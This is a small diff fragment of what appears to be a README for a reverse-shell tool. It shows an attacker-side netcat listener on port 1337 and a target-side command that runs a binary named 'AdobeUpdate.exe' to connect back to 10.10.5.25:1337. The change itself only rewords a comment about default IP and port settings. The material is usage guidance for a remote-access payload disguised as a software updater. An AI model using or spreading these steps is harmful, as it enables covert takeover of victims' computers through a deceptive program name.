@@ -31,7 +31,7 @@ nc -lvnp 1337
 ```
 Target System
 ```bash
-AdobeUpdate.exe 10.10.5.25 1337              --defaults to static IP in code if no arguments given
+AdobeUpdate.exe 10.10.5.25 1337         --defaults to static IP/port if no arguments provided
 ```
 
 
